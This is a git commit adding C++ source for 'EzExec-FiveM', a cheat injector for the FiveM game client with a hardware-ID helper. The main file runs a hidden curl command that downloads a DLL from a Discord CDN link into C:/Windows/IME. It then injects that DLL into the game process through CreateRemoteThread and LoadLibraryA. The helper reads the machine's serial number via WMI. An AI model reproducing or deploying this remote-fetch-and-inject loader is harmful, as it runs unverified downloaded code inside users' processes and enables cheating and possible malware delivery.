4ac79f44109cc707d0ca5bb9258395504238ebdc
MasterDev <99542861+Student-MasterDev@users.noreply.github.com>
2022-02-13 22:01:44 +0100

    Add files via upload

---
+++ EzExec-FiveM By MasterDev/EzExec-FiveM.cpp
@@ -0,0 +1,164 @@
+#include <stdio.h>
+#include <string>
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+#include <time.h>
+#include <string>
+#include <iostream>
+#include "auth.h"
+#include <Windows.h>
+#include <TlHelp32.h>
+#include <random>
+#include <csignal>
+#include <fstream>
+#include <iostream>
+#include <sstream> //std::stringstream
+#include <iostream>
+#include <random>
+#include <string>
+#include <fstream>
+#include <sstream>
+#include <strsafe.h>
+#include "Console.h"
+#pragma comment(lib, "urlmon.lib")
+#define UNLEN 64
+
+string sp = a_gethid();
+
+using namespace std;
+namespace con = JadedHoboConsole;
+
+bool GetProcessEntryByName(string name, PROCESSENTRY32* pe) {
+	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE) {
+		cerr << "Tool helper cannot be created" << endl;
+		return false;
+	}
+
+	if (!Process32First(snapshot, pe)) {
+		cerr << "Tool helper cannot retrieve the first entry of process list" << endl;
+		return false;
+	}
+
+	do {
+		if (pe->szExeFile == name) {
+			snapshot ? CloseHandle(snapshot) : 0;
+			return true;
+		}
+	} while (Process32Next(snapshot, pe));
+
+	snapshot ? CloseHandle(snapshot) : 0;
+	return false;
+}
+
+void clear() {
+	COORD topLeft = { 0, 0 };
+	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
+	CONSOLE_SCREEN_BUFFER_INFO screen;
+	DWORD written;
+
+	GetConsoleScreenBufferInfo(console, &screen);
+	FillConsoleOutputCharacterA(
+		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
+	);
+	FillConsoleOutputAttribute(
+		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
+		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
+	);
+	SetConsoleCursorPosition(console, topLeft);
+}
+
+DWORD GetProcId(const char* procName)
+{
+	DWORD procId = 0;
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (hSnap != INVALID_HANDLE_VALUE)
+	{
+		PROCESSENTRY32 procEntry;
+		procEntry.dwSize = sizeof(procEntry);
+
+		if (Process32First(hSnap, &procEntry))
+		{
+			do
+			{
+				if (!_stricmp(procEntry.szExeFile, procName))
+				{
+					procId = procEntry.th32ProcessID;
+					break;
+				}
+			} while (Process32Next(hSnap, &procEntry));
+		}
+	}
+	CloseHandle(hSnap);
+	return procId;
+}
+
+int main(int argc, const char* argv[]) {
+	SetConsoleTitleA("EzExec FiveM | By MasterDev#6666 | KEKHACK.com | Discord : https://discord.gg/kzveCJmDbG");
+	clear();
+	string  path;
+	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+	if (GetProcessEntryByName("FiveM.exe", &pe)) {
+		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] You need open exec before " << con::fg_yellow << "FiveM" << con::fg_white << " !";
+		Sleep(999999999999999999);
+	}
+	cout << "[" << con::fg_red << "+" << con::fg_white <<  "] Waiting for " << con::fg_green << "FiveM_b2545_GTAProcess.exe" << con::fg_red << " [Only]" << con::fg_white << " ..." << endl;
+	for (; !GetProcessEntryByName("FiveM_b2545_GTAProcess.exe", &pe); Sleep(100));
+	system("curl https://cdn.discordapp.com/attachments/918450765335502858/941025574577651742/kekhack_fivem_premium.dll --output C:/Windows/IME/kekhack_fivem_premium.dll >nul 2>&1");
+	cout << "[" << con::fg_red << "+" << con::fg_white << "] Injected !" << endl;
+	Sleep(3000);
+	clear();
+	cout << "[" << con::fg_green << "/" << con::fg_white << "] Thank you for choosing " << con::fg_blue << "EzShop " << con::fg_white << "!" << endl;
+	Sleep(500);
+	cout << "[" << con::fg_green << "/" << con::fg_white << "] Server is " << con::fg_green << "online" << con::fg_white << " ..." << endl;
+	cout << "[" << con::fg_green << "/" << con::fg_white << "] You have " << con::fg_green << "last update " << con::fg_white << "..." << endl;
+	cout << "[" << con::fg_green << "/" << con::fg_white << "] The exec is " << con::fg_green << "not disabled " << con::fg_white << "..." << endl;
+	std::cout << "\n";
+	cout << "[" << con::fg_green << "1" << con::fg_white << "]" << con::fg_magenta << " KEKHACK" << con::fg_white << endl;
+	cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Menu : " << con::fg_white;
+	string number;
+	cin >> number;
+	if (number == "1") {
+
+		const char* dllPath = "C:\\Windows\\IME\\kekhack_fivem_premium.dll";
+		const char* procName = "FiveM_b2545_GTAProcess.exe";
+		DWORD procId = 0;
+
+		while (!procId)
+		{
+			procId = GetProcId(procName);
+			Sleep(30);
+		}
+
+		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);
+
+		if (hProc && hProc != INVALID_HANDLE_VALUE)
+		{
+			void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+			WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
+
+			HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
+
+			if (hThread)
+			{
+				CloseHandle(hThread);
+			}
+		}
+
+		if (hProc)
+		{
+			CloseHandle(hProc);
+		}
+		return 0;
+
+		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected !" << endl;
+		Sleep(99999999999999);
+	}
+	else {
+		cout << "[" << con::fg_red << "!" << con::fg_white << "] Wrong choice !" << con::fg_white << endl;
+		Sleep(999999999999999);
+	}
+}
---
+++ EzExec-FiveM By MasterDev/auth.h
@@ -0,0 +1,208 @@
+#pragma once
+
+#define _WIN32_DCOM
+#include <iostream>
+using namespace std;
+#include <comdef.h>
+#include <Wbemidl.h>
+
+#pragma once
+#pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib, "wininet.lib")
+
+#include <stdio.h>
+#include <windows.h>
+#include <TlHelp32.h>
+#include <string>
+#include <wininet.h>
+
+#pragma comment(lib, "wbemuuid.lib")
+
+
+
+
+string a_replaceAll(string subject, const string& search,
+	const string& replace) {
+	size_t pos = 0;
+	while ((pos = subject.find(search, pos)) != string::npos) {
+		subject.replace(pos, search.length(), replace);
+		pos += replace.length();
+	}
+	return subject;
+}
+
+string a_DownloadURL(string URL) {
+	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+	HINTERNET urlFile;
+	string rtn;
+	if (interwebs) {
+		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
+		if (urlFile) {
+			char buffer[2000];
+			DWORD bytesRead;
+			do {
+				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
+				rtn.append(buffer, bytesRead);
+				memset(buffer, 0, 2000);
+			} while (bytesRead);
+			InternetCloseHandle(interwebs);
+			InternetCloseHandle(urlFile);
+			string p = a_replaceAll(rtn, "|n", "\r\n");
+			return p;
+		}
+	}
+	InternetCloseHandle(interwebs);
+	string p = a_replaceAll(rtn, "|n", "\r\n");
+	return p;
+}
+
+std::string a_ws2s(const std::wstring& s)
+{
+	int len;
+	int slength = (int)s.length() + 1;
+	len = WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, 0, 0, 0, 0);
+	char* buf = new char[len];
+	WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, buf, len, 0, 0);
+	std::string r(buf);
+	delete[] buf;
+	return r;
+}
+
+string a_gethid()
+{
+	HRESULT hres;
+
+	// Step 1: --------------------------------------------------
+	// Initialize COM. ------------------------------------------
+
+	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+
+	hres = CoInitializeSecurity(
+		NULL,
+		-1,                          // COM authentication
+		NULL,                        // Authentication services
+		NULL,                        // Reserved
+		RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
+		RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
+		NULL,                        // Authentication info
+		EOAC_NONE,                   // Additional capabilities 
+		NULL                         // Reserved
+	);
+
+	IWbemLocator* pLoc = NULL;
+
+	hres = CoCreateInstance(
+		CLSID_WbemLocator,
+		0,
+		CLSCTX_INPROC_SERVER,
+		IID_IWbemLocator, (LPVOID*)&pLoc);
+	// Step 4: -----------------------------------------------------
+	// Connect to WMI through the IWbemLocator::ConnectServer method
+
+	IWbemServices* pSvc = NULL;
+
+	// Connect to the root\cimv2 namespace with
+	// the current user and obtain pointer pSvc
+	// to make IWbemServices calls.
+	hres = pLoc->ConnectServer(
+		_bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
+		NULL,                    // User name. NULL = current user
+		NULL,                    // User password. NULL = current
+		0,                       // Locale. NULL indicates current
+		NULL,                    // Security flags.
+		0,                       // Authority (for example, Kerberos)
+		0,                       // Context object 
+		&pSvc                    // pointer to IWbemServices proxy
+	);
+
+	//cout << "Connected to ROOT\\CIMV2 WMI namespace" << endl;
+
+
+	// Step 5: --------------------------------------------------
+	// Set security levels on the proxy -------------------------
+
+	hres = CoSetProxyBlanket(
+		pSvc,                        // Indicates the proxy to set
+		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
+		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
+		NULL,                        // Server principal name 
+		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
+		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
+		NULL,                        // client identity
+		EOAC_NONE                    // proxy capabilities 
+	);
+
+	if (FAILED(hres))
+	{
+		cout << "Could not set proxy blanket. Error code = 0x"
+			<< hex << hres << endl;
+		pSvc->Release();
+		pLoc->Release();
+		CoUninitialize();
+		return "NULL";               // Program has failed.
+	}
+
+	// Step 6: --------------------------------------------------
+	// Use the IWbemServices pointer to make requests of WMI ----
+
+	// For example, get the name of the operating system
+	IEnumWbemClassObject* pEnumerator = NULL;
+	hres = pSvc->ExecQuery(
+		bstr_t("WQL"),
+		bstr_t("SELECT * FROM Win32_OperatingSystem"),
+		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+		NULL,
+		&pEnumerator);
+
+	if (FAILED(hres))
+	{
+		cout << "Query for operating system failed."
+			<< " Error code = 0x"
+			<< hex << hres << endl;
+		pSvc->Release();
+		pLoc->Release();
+		CoUninitialize();
+		return "NULL";               // Program has failed.
+	}
+
+	// Step 7: -------------------------------------------------
+	// Get the data from the query in step 6 -------------------
+
+	IWbemClassObject* pclsObj = NULL;
+	ULONG uReturn = 0;
+
+	BSTR sernum = (BSTR)"NULL";
+
+	while (pEnumerator)
+	{
+		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
+			&pclsObj, &uReturn);
+
+		if (0 == uReturn)
+		{
+			break;
+		}
+
+		VARIANT vtProp;
+
+		// Get the value of the Name property
+		hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
+		//wcout << " SerialNumber : " << vtProp.bstrVal << endl;
+		sernum = vtProp.bstrVal;
+		VariantClear(&vtProp);
+
+		pclsObj->Release();
+	}
+
+	// Cleanup
+	// ========
+	pSvc->Release();
+	pLoc->Release();
+	pEnumerator->Release();
+	CoUninitialize();
+
+	std::wstring ret(sernum, SysStringLen(sernum));
+
+	return a_ws2s(ret);   // Program successfully completed.
+
+}
